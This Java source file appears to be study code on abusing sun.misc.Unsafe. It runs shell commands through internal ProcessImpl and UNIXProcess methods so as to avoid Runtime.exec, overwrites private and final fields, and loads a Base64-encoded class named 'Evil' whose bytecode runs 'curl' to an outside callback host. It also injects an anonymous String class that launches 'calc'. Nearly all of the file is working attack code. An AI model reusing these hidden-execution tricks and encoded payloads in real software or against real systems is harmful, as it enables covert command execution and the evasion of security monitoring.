package basicknowledge;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import sun.misc.JavaIOFileDescriptorAccess;
import sun.misc.Unsafe;
import util.ReflectionUtils;
import util.UnsafeUtil;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Base64;

public class LearnUnsafe {
    public static void main(String[] args) throws NoSuchFieldException, ClassNotFoundException, IllegalAccessException, IOException, InvocationTargetException, NoSuchMethodException, InstantiationException, CannotCompileException {
//        Unsafe unsafe = getUnsafe();
//        unsafe.allocateInstance();
        defineNiMingClass();
    }
    public static Unsafe getUnsafe() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Class clazz = Class.forName("sun.misc.Unsafe");
        Field getUnsafe = clazz.getDeclaredField("theUnsafe");
        getUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) getUnsafe.get(null);
        return unsafe;
    }
    public static void execWindowCommand() throws IOException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException, InvocationTargetException {
        Class<?> clazz = Class.forName("sun.misc.Unsafe");
        Field field = clazz.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        Class<?> processImpl = Class.forName("java.lang.ProcessImpl");
        Process process = (Process) unsafe.allocateInstance(processImpl);
        Method create = processImpl.getDeclaredMethod("create", String.class, String.class, String.class, long[].class, boolean.class);
        create.setAccessible(true);
        long[] stdHandles = new long[]{-1L, -1L, -1L};
        create.invoke(process, "whoami", null, null, stdHandles, false);

        JavaIOFileDescriptorAccess fdAccess
                = sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();
        FileDescriptor stdout_fd = new FileDescriptor();
        fdAccess.setHandle(stdout_fd, stdHandles[1]);
        InputStream inputStream = new BufferedInputStream(
                new FileInputStream(stdout_fd));

        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
    public static void execLinuxCommand() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        String cmd = "whoami";

        int[] ineEmpty = {-1, -1, -1};

        Class unsafeClazz = Class.forName("sun.misc.Unsafe");
        Field getUnsafe = unsafeClazz.getDeclaredField("theUnsafe");
        getUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) getUnsafe.get(null);

        Class clazz = Class.forName("java.lang.UNIXProcess");
        Object obj = unsafe.allocateInstance(clazz);
        Field helperpath = clazz.getDeclaredField("helperpath");
        helperpath.setAccessible(true);
        Object path = helperpath.get(obj);
        byte[] prog = "/bin/bash\u0000".getBytes();
        String paramCmd = "-c\u0000" + cmd + "\u0000";
        byte[] argBlock = paramCmd.getBytes();
        int argc = 2;
        Method exec = clazz.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class);
        exec.setAccessible(true);
        exec.invoke(obj, 2, path, prog, argBlock, argc, null, 0, null, ineEmpty, false);
    }

    public static void memorySet() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Class clazz = Class.forName("sun.misc.Unsafe");
        Field getUnsafe = clazz.getDeclaredField("theUnsafe");
        getUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) getUnsafe.get(null);

        UnsafeTest unsafeTest = new UnsafeTest();
        System.out.println(unsafeTest.getCmd());


        Class test = Class.forName("basicknowledge.UnsafeTest");

        Field secret = test.getDeclaredField("SECRET");
        System.out.println(ReflectionUtils.getField(test,"SECRET").get(unsafeTest));

        Field cmd = test.getDeclaredField("cmd");
        UnsafeUtil.setFinalStatic(cmd, "ipconfig");
        unsafe.putObject(unsafeTest, unsafe.staticFieldOffset(cmd), "ipconfig");
        System.out.println(unsafeTest.getCmd());

        unsafe.putObject(unsafeTest.getClass(), unsafe.objectFieldOffset(secret), "hacked");
        System.out.println(ReflectionUtils.getField(test,"SECRET").get(unsafeTest));
    }
    public static void defineClass() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            // byte[] code = ClassPool.getDefault().getCtClass("Evil").toBytecode();
            // System.out.println(Base64.getEncoder().encodeToString(code));
            String CLASS_BYTE_Base64 = "yv66vgAAADQAKAoACAAYCgAZABoIABsKABkAHAcAHQoABQAeBwAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMUkNFOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB0BAApTb3VyY2VGaWxlAQAIUkNFLmphdmEMAAoACwcAIgwAIwAkAQAWY3VybCBjaDZ1LmNhbGxiYWNrLnJlZAwAJQAmAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJwALAQADUkNFAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAABAAkAAAACAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAABAAOAAAADAABAAAABQAPABAAAAAIABEACwABAAwAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADQAAABYABQAAAAcACQAKAAwACAANAAkAEQALAA4AAAAMAAEADQAEABIAEwAAABQAAAAHAAJMBwAVBAABABYAAAACABc=";

            Class clazz = Class.forName("sun.misc.Unsafe");
            Field getUnsafe = clazz.getDeclaredField("theUnsafe");
            getUnsafe.setAccessible(true);
            Unsafe unsafe = (Unsafe) getUnsafe.get(null);

            // 获取系统的类加载器
            ClassLoader classLoader = ClassLoader.getSystemClassLoader();
            // 创建默认的保护域
            ProtectionDomain domain = new ProtectionDomain(
                    new CodeSource(null, (Certificate[]) null), null, classLoader, null
            );
            byte[] b = Base64.getDecoder().decode(CLASS_BYTE_Base64);
            unsafe.defineClass("Evil", b, 0, b.length, classLoader, domain);
            Class.forName("Evil");
    }
    public static void defineNiMingClass() throws CannotCompileException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException, ClassNotFoundException {
        Class clazz = Class.forName("sun.misc.Unsafe");
        Field getUnsafe = clazz.getDeclaredField("theUnsafe");
        getUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) getUnsafe.get(null);

        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("java.lang.String");
        CtMethod toString = CtMethod.make("public String toString(){java.lang.Runtime.getRuntime().exec(\"calc\");return null;}", ctClass);
        toString.setName("toString");
        ctClass.addMethod(toString);
        byte[] bytes = ctClass.toBytecode();

        Class anonymous = unsafe.defineAnonymousClass(String.class, bytes, null);
        System.out.println(anonymous.getName());
        System.out.println(anonymous.newInstance());
    }
}
